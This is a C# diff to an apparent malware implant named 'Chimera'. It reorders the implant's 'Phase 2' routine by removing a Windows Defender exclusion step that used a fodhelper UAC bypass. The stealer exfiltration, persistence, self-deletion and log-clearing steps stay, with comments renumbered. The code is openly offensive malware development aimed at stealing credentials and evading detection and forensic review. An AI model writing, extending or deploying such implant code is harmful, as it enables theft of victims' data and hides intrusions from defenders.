@@ -57,20 +57,8 @@ namespace Chimera
             string startupTaskID = "startup-" + Guid.NewGuid().ToString("N").Substring(0, 8);
             Logger.Info("Phase 2 start. TaskID=" + startupTaskID);
 
-            // 2a. Defender exclusion
-            Logger.Info("2a: Running Defender exclusion (fodhelper)...");
-            try
-            {
-                string excResult = Commands.DefenderExclusion.Execute();
-                Logger.Ok("Defender exclusion result: " + excResult);
-            }
-            catch (Exception ex) { Logger.Err("Defender exclusion exception: " + ex.Message); }
-
-            Logger.Info("Waiting 3.5s for exclusion to propagate...");
-            Thread.Sleep(3500);
-
-            // 2b. Stealer exfil
-            Logger.Info("2b: Running stealer exfil...");
+            // 2a. Stealer exfil (no folder exclusion needed — stealer runs in-memory)
+            Logger.Info("2a: Running stealer exfil...");
             try
             {
                 string stealResult = Commands.StealerExfil.Execute(startupTaskID, Tasking.CallbackUUID);
@@ -78,8 +66,8 @@ namespace Chimera
             }
             catch (Exception ex) { Logger.Err("Stealer exception: " + ex.Message); }
 
-            // 2c. Persistence
-            Logger.Info("2c: Installing persistence...");
+            // 2b. Persistence
+            Logger.Info("2b: Installing persistence...");
             try
             {
                 string persistResult = Commands.Persist.Execute();
@@ -87,7 +75,7 @@ namespace Chimera
             }
             catch (Exception ex) { Logger.Err("Persist exception: " + ex.Message); }
 
-            // 2d. Self-delete
+            // 2c. Self-delete
             Logger.Info("2d: Self-deleting exe...");
             try
             {
@@ -101,7 +89,7 @@ namespace Chimera
             }
             catch (Exception ex) { Logger.Err("Self-delete exception: " + ex.Message); }
 
-            // 2e. Clear logs
+            // 2d. Clear logs
             Logger.Info("2e: Clearing logs...");
             try
             {
